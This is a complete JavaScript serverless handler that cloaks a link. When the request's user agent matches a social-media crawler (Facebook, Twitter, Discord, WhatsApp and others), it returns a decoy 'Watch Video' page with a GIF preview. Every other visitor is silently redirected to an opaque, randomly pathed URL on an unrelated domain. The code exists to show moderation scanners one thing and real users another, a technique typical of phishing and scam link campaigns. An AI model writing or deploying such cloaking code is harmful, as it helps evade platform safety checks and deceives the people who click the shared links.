```javascript
export default function handler(req, res) {
  const destination =
    "https://racialburgerdiverse.com/dS29JqD/B7znf77/wQ6omTrppMaIJ6f/F8yQtsycESAL8Q/ORweFfE2X4/SeMxtgTv5/7fI/_oOIYDP8dloWrrrv/-xVhS/usR/F7nbTgJkNVR/2KNM2i4t_9iaixAdt/K4x820orBcVQ";

  const previewImage =
    "https://pub-9106393a3bc14926b10613a0c98b892a.r2.dev/fol4/motorola14.gif";

  const userAgent = (req.headers["user-agent"] || "").toLowerCase();

  const socialCrawlers = [
    "facebookexternalhit",
    "facebot",
    "twitterbot",
    "linkedinbot",
    "pinterest",
    "slackbot",
    "discordbot",
    "telegrambot",
    "whatsapp"
  ];

  const isSocialCrawler = socialCrawlers.some(bot =>
    userAgent.includes(bot)
  );

  if (isSocialCrawler) {
    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">

  <title>Watch Video</title>

  <meta property="og:title" content="Watch Video">
  <meta property="og:description" content="Watch this video">
  <meta property="og:image" content="https://pub-9106393a3bc14926b10613a0c98b892a.r2.dev/fol4/motorola14.gif">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:type" content="website">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Watch Video">
  <meta name="twitter:description" content="Watch this video">
  <meta name="twitter:image" content="https://pub-9106393a3bc14926b10613a0c98b892a.r2.dev/fol4/motorola14.gif">
</head>
<body>
</body>
</html>`;

    res.status(200);
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.setHeader("Cache-Control", "no-store");

    return res.end(html);
  }

  // Actual HTTP 302 redirect for normal visitors
  res.status(302);
  res.setHeader("Location", destination);
  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate");

  return res.end();
}
```
